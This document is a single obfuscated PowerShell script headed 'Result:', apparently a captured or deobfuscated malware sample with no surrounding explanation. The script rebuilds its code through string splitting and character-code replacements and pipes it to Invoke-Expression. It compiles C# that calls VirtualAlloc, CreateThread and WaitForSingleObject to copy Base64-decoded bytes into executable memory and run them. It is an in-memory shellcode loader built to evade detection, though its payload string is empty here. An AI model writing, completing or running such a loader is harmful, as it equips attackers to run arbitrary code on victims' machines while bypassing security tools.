Result:
(  (  'Set-StrictMode -Versi' +'on 2
Xm6ef = @D4y
        using System;
        using System.Runt'  +'ime.InteropServices;
        namespace oWkM {
                public class func {
                        [Flags] p'+  'ublic en' +  'um AllocationType { Commit = 0x1000, Re'  +'serve = 0x2000 }
                        [Flags]'+' public e' + 'num MemoryProtection { ExecuteReadWrite = 0x40 }
                        [Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
                        [DllImport(D4ykernel32.'+ 'dll'+'D4y)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
                        [DllImport(D4ykernel32.dllD4y)] public static extern IntPtr Creat'  + 'eThread(In' +  'tPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
                        [DllImport(D4ykernel32.dllD4y)] publ' +  'ic static exter' +  'n int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
                }
        }
D4y@

Xm6anrhX ='  +  ' New-Object M'+'icrosoft.CSharp.CSharpCodeProvider
Xm6oR = New-Object System.CodeDom.Compiler.CompilerParameters
Xm6oR.ReferencedAssemblies.AddRan'  +'ge(@(D4ySystem.dllD4y, [PsObject].Assemb'+  'ly.Location)' + ')
X'+'m6o'  +  'R.GenerateInMemory = Xm6True
Xm6kxVZ2 = Xm6anrhX.CompileAssemblyFromSource(Xm6o'+'R, Xm6ef)

[Byte[]]Xm6ukXTI'+  ' = [' +  'Syste'  +  'm.Convert]::FromBase64String(D4yD4y)
Xm6ki = [oWkM.func]::Virtual'+'Alloc(0, Xm6ukXTI.Length + 1, [oWkM.func+All'+ 'ocationType]::Reserve -bOr [oWkM.'  + 'func+AllocationType]::Commit, [oWkM.func+MemoryProtection]::ExecuteReadWrite)
if ('  + '[Bool]!Xm6ki) { Xm6global:result ='+' 3; return }
[Syst'+  'em.Ru'  + 'ntime.InteropServices.Mar'  +'shal]::Copy(Xm6ukXTI, 0, Xm6ki, Xm6ukXTI.Length)
[IntPtr] Xm6y2Ou = '  +'[oWkM.func]::CreateTh'+ 'read(0,0,Xm6ki,0,0,0)
if ([Bool]!Xm6y2Ou) { Xm6global:result = 7; return }
Xm6og = [oWkM.func]::Wai'  +  'tForSingleObject(Xm6y2Ou, [oWkM.func+Time]::Infinite)
' ) -CrePlAcE (  [CHaR]88+  [CHaR]109 + [CHaR]54  ),[CHaR]36  -rEPlACe  ([CHaR]68+[CHaR]52+[CHaR]121),[CHaR]34 )  |  iex
